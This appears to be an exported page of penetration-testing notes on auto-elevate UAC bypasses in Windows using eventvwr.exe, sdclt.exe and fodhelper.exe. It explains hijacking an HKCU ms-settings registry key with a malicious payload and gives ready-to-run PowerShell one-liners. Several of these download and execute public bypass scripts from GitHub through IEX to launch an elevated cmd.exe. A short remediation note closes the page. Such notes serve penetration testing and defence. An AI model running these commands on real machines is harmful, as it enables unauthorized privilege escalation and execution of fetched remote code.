<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>AutoElevate UAC bypass (Powershell)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>AutoElevate UAC bypass (Powershell)</h1><br/><br /><strong>Prerequisite:</strong><br />• Windows OS &gt; 7 (not included)<br /><br />1. executable with AutoElevate and requireAdministrator “privileges” in the Manifest<br />    Some Microsoft signed binaries, can auto-elevate themselves from <a href="etration_Test_Methodology--Network_Pentest--Post_Exploitation--Privilege_Escalation--Windows_Privilege_Escalation--9._Access_Tokens_(UAC).html">Medium Integrity to High Integrity level</a> thanks to their &quot;Manifest&quot; inside the executable.<br />    <span style="color:#ff0000;">If requestedExecutionLevel is set to “AsInvoker”(usually on Windows 7), it prevent auto-elevation when started from medium integrity</span><br />   <strong>Strings(SysInternals):</strong> <a href="https://download.sysinternals.com/files/Strings.zip">https://download.sysinternals.com/files/Strings.zip</a><br />   ◇ checking <a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/">eventvwr.exe</a><span style="color:#3ad900;"> </span><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://download.sysinternals.com/files/Strings.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\strings&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\strings\strings.exe -accepteula C:\Windows\System32\eventvwr.exe | findstr /i &#39;level= autoelevate&#39;&quot;</span>; <span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>; <span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-r</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\strings&quot;</span>;</pre></div><br />    <a href=""><img src="images/1377-1.png" alt="images/1377-1.png" /></a><br />   ◇ checking <a href="https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/">sdclt.exe</a><span style="color:#3ad900;"> </span><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://download.sysinternals.com/files/Strings.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\strings&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\strings\strings.exe -accepteula C:\Windows\System32\sdclt.exe | findstr /i &#39;level= autoelevate&#39;&quot;</span>; <span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>; <span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-r</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\strings&quot;</span>;</pre></div><br />    <a href=""><img src="images/1377-2.png" alt="images/1377-2.png" /></a><br />   ◇ checking <a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/">fodhelper.exe</a> <br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://download.sysinternals.com/files/Strings.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\strings&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\strings\strings.exe -accepteula C:\Windows\System32\fodhelper.exe | findstr /i &#39;level= autoelevate&#39;&quot;</span>; <span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>; <span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-r</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\strings&quot;</span>;</pre></div><br />    <a href=""><img src="images/1377-3.png" alt="images/1377-3.png" /></a><br />2. If this executable does not find a registry key in HKCU, because of the current user has total permission to create or modify any key on HKCU registry, the binary is exploitable.<br />    We can check the registry keys loaded from the executable with &quot;Process Monitor&quot; Sysinternal application<br />    The operation on the registry key it need to be of this type:<br />   1) Operation → RegOpenKey<br />   2) Path → HKCU\Software\Classes\ms-settings\Shell\Open\command<br />   3) Result → NAME NOT FOUND  <br />    We can add this registry key with a custom malicious value. For example a path to a malicious payload.<br />   ◇ Check eventvwr.exe (automated script)<br />       <div class="codebox"><pre>PS&gt; IEX<span style="color:#ff9d00;font-weight:700">(</span>New-Object Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.DownloadString<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1 &quot;</span><span style="color:#ff9d00;font-weight:700">);</span>Invoke-EventVwrBypass -Command <span style="color:#3ad900;font-weight:400">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe cmd.exe&quot;</span></pre></div><br />   ◇ Check sdclt.exe (automated script)<br />       <div class="codebox"><pre>PS&gt; IEX<span style="color:#ff9d00;font-weight:700">(</span>New-Object Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.DownloadString<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-SDCLTBypass.ps1 &quot;</span><span style="color:#ff9d00;font-weight:700">);</span>Invoke-SDCLTBypass -Command <span style="color:#3ad900;font-weight:400">&quot;C:\Windows\System32\cmd.exe /c cmd.exe&quot;</span></pre></div><br />   ◇ Check fodHelper.exe (automated script)<br />       <div class="codebox"><pre>PS&gt; IEX<span style="color:#ff9d00;font-weight:700">(</span>New-Object Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.DownloadString<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;https://gist.githubusercontent.com/netbiosX/a114f8822eb20b115e33db55deee6692/raw/bd61ba9db7af8ffcd57d3dbfa8208b495cdc854d/FodhelperUACBypass.ps1 &quot;</span><span style="color:#ff9d00;font-weight:700">);</span>FodhelperUACBypass -program <span style="color:#3ad900;font-weight:400">&quot;cmd.exe&quot;</span></pre></div><br /><br /><strong>Remediation:</strong><br />This particular technique can be remediated or fixed by setting the UAC level to “Always Notify” or by removing the current user from the Local Administrators group.<br /><br /><strong>Bibliography:</strong><br />• <a href="https://pentestlab.blog/2017/06/09/uac-bypass-sdclt/">https://pentestlab.blog/2017/06/09/uac-bypass-sdclt/</a><br />• <a href="https://posts.specterops.io/fileless-uac-bypass-using-sdclt-exe-3e9f9ad4e2b3">https://posts.specterops.io/fileless-uac-bypass-using-sdclt-exe-3e9f9ad4e2b3</a><br />• <a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/">https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</a><br />• <a href="https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/">https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/</a><br />• <a href="https://egre55.github.io/system-properties-uac-bypass/">https://egre55.github.io/system-properties-uac-bypass/</a><br />• <a href="https://soclevelone.com/index.php/2019/01/14/bypassing-windows-uac/">https://soclevelone.com/index.php/2019/01/14/bypassing-windows-uac/</a><br /><br /><br /><br />----------------------------------------------------------------------------------------------------<br /><br /><strong>Process Monitor</strong> (already as Administrator for testing purpose)<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://download.sysinternals.com/files/ProcessMonitor.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\procmon64.exe&quot;</span>; <span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\procmon64.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;</pre></div><br />Filter → Filter<br />    <a href=""><img src="images/1377-4.png" alt="images/1377-4.png" /></a><br />    <a href=""><img src="images/1377-5.png" alt="images/1377-5.png" /></a><br /><br /><strong>Process Explorer</strong> (already as Administrator for testing purpose)<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://download.sysinternals.com/files/ProcessExplorer.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\procexp.exe&quot;</span>; <span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.zip&quot;</span>;</pre></div></div>
</body>
</html>
